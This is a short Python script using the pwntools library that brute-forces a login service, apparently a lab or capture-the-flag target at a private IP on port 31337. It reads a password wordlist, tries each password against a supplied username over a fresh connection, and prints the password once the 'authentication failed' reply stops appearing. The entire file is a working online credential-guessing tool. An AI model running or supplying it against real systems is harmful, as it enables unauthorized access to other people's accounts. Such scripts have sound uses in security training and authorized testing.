#!/usr/bin/python

from pwn import *
import time
import sys

user = sys.argv[1]
password_file = sys.argv[2]
ip = '192.168.122.102'
port = 31337

passwords = open(password_file, 'r').read().splitlines()

for password in passwords:
    p = remote(ip, port)
    p.recvuntil("username>", timeout=10)
    p.sendline(user)
    p.recvuntil("password>", timeout=10)
    p.sendline(password)
    message = p.recvline(timeout=10)
    if b"authentication failed" not in message:
        print(f"password for {user} is {password}")
        exit(0)
    p.close()

